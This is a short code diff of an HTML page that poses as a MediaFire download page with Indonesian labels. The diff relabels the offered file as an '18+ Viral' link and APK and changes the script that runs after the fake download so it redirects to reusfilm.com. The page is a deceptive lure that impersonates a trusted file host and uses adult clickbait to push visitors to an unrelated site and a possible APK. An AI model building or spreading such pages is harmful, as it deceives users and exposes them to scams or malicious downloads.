@@ -68,8 +68,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                     <img src="https://static.mediafire.com/images/filetype/file-video-v3.png">
                 </div>
                 <div class="title">
-                    <span class="atas">Kienzy Viral 45detik</span>
-                    <span class="bawah">Unduh (455 MB)</span>
+                    <span class="atas">Link and apk 18+ Viral</span>
+                    <span class="bawah">Unduh (44 KB)</span>
                 </div>
                 <div class="do-btn">
                     <img src="https://static.mediafire.com/images/icons/svg_light/download.svg">
@@ -331,7 +331,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                         $('.download').hide();
                         flexing('.downloaded');
                         setTimeout(() => {
-                            window.location.href = 'https://mega.nz/folder/KmBmgaBJ'
+                            window.location.href = 'https://reusfilm.com/'
                         }, 1000)
                     }
                 })
